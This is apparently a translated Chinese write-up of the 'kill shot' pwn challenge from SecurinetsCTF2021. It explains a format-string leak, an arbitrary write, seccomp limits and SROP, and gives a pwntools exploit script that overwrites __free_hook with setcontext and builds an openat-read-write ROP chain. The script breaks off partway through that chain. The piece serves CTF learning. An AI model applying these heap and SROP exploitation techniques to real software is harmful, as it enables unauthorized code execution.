# SecurinetsCTF2021 PWN 部分 WriteUP
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## kill shot
首先看一下程序的逻辑
    __int64 __fastcall main(__int64 a1, char **a2, char **a3)
    {
      int v3; // eax
      int v5; // [rsp+Ch] [rbp-24h]
      set_all_buf();
      set_seccom(a1, a2);
      welcome();
      kill();
      write(1, "Now let's take it's time for heap exploitation session.\n", 0x38uLL);
      while ( v5 != 3 )
      {
        menu();
        v3 = get_int();
        v5 = v3;
        if ( v3 == 1 )
        {
          add();
        }
        else if ( v3 == 2 )
        {
          delete();
        }
      }
      return 0LL;
    }
程序开启了沙箱，我们看一下沙箱的规则
     line  CODE  JT   JF      K
    =================================
     0000: 0x20 0x00 0x00 0x00000004  A = arch
     0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
     0002: 0x20 0x00 0x00 0x00000000  A = sys_number
     0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
     0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
     0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
     0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
     0007: 0x15 0x02 0x00 0x00000005  if (A == fstat) goto 0010
     0008: 0x15 0x01 0x00 0x0000000a  if (A == mprotect) goto 0010
     0009: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0011
     0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0011: 0x06 0x00 0x00 0x00000000  return KILL
这里很明显是要我们进行`orw`读取`flag`，并且这里只允许了`openat`函数。接着往下看，在`welcome`函数中存在一个格式化字符串，我们根据此漏洞可以泄漏得到`elf,libc`这两个的基地址。
    unsigned __int64 sub_FE3()
    {
      char buf[56]; // [rsp+10h] [rbp-40h] BYREF
      unsigned __int64 v2; // [rsp+48h] [rbp-8h]
      v2 = __readfsqword(0x28u);
      write(1, "This is an introduction to format string vulnerability!\n", 0x38uLL);
      write(1, "Format: ", 8uLL);
      read(0, buf, 0x31uLL);
      if ( strchr(buf, 'n') )
      {
        write(1, "That's dangerous never use that format\n", 0x27uLL);
        exit(1);
      }
      printf(buf); // <<< 格式化字符串漏洞
      return __readfsqword(0x28u) ^ v2;
    }
在接下来在`kill`函数中程序提供了一个任意地址写，也就是说我们在泄漏了`libc`基地址的情况下还可以进行一个任意地址写。
再接着往下看，程序提供了两种功能分别是`add,delete`。`add`函数根据用户输入了`size`分配了指定大小的堆块，并将分配得到的堆块地址写入到了全局数组中。`delete`则是根据用户指定的索引删除了相应的堆块。
到这里题目的思路就很清楚了，也就是首先利用泄漏得到的`libc`基地址和任意地址写覆写`free_hook`为`setcontext`函数的地址，以进行`srop`。
###  srop
这里简单的介绍一个`SROP`的原理，更详细的分析请看`CTF-WIKI`。
`SROP`即`signal
rop`。我们知道LINUX中有各种各样的信号，`LINUX`对每个信号都需要进行处理，那么当进行信号处理的时候就需要中断当前的程序，保存上下文之后进行信号处理，信号处理完毕之后再进行上下文的恢复继续运行程序剩余的部分。
`SROP`利用的就是恢复上下文的过程。在保存上下文的时候回用到`Signal
Frame`结构体，结构体中保存了包含寄存器在内的所有程序运行相关的信息，该结构体存储于用户空间，因此用户可以对该结构体进行读写，那么到这里原理就出来了，如果我们修改该结构体如`rip`寄存器，那么在恢复上下文的时候rip就会被改写为我们刚刚设置的值。
进一步我们可以伪造该结构体，并且调用类似恢复上下文的函数`setcontext`，那么就可以控制所有的寄存器。
回到这一题在构造`rop`的时候需要注意两个点，一个是只能使用`openat`系统调用来打开文件，第二个就是这里打开文件之后的文件描述符是`5`，而不是`3`。
    # encoding=utf-8
    from pwn import *
    file_path = "./kill_shot"
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(file_path)
    p = remote('bin.q21.ctfsecurinets.com', 1338)
    libc = ELF('./libc.so.6')
    def add(size, content=b"1212"):
        p.sendlineafter("3- exit\n", "1")
        p.sendlineafter("Size: ", str(size))
        p.sendafter("Data: ", content)
    def delete(index):
        p.sendlineafter("3- exit\n", "2")
        p.sendlineafter("Index: ", str(index))
    payload = "-%13$p-%25$p-"
    p.sendlineafter("Format: ", payload)
    p.recvuntil("-")
    elf.address = int(p.recvuntil("-", drop=True), 16) - 0xd8c
    libc.address = int(p.recvuntil("-", drop=True), 16) - 231 - libc.sym['__libc_start_main']
    log.success("elf address is {}".format(hex(elf.address)))
    log.success("libc address is {}".format(hex(libc.address)))
    p.sendlineafter("Pointer: ", str(libc.sym['__free_hook']))
    p.sendafter("Content: ", p64(libc.sym['setcontext'] + 53))
    frame = SigreturnFrame()
    frame.rip = libc.sym['read']
    frame.rdi = 0
    frame.rsi = libc.sym['__free_hook'] + 0x10
    frame.rdx = 0x120
    frame.rsp = libc.sym['__free_hook'] + 0x10
    p_rsi_r = 0x0000000000023e8a + libc.address
    p_rdi_r = 0x000000000002155f + libc.address
    p_rdx_r = 0x0000000000001b96 + libc.address
    p_rax_r = 0x0000000000043a78 + libc.address
    syscall = 0x00000000000d29d5 + libc.address
    flag_str_address = libc.sym['__free_hook'] + 0x110
    flag_address = libc.sym['__free_hook'] + 0x140
    orw = flat([
        p_rax_r, 257,
        p_rdi_r, 0xffffff9c,
        p_rsi_r, flag_str_address,
        p_rdx_r, 0,
        syscall, 
        p_rdi_r, 5,
        p_rsi_r, flag_address,
        p_rdx_r, 0x50,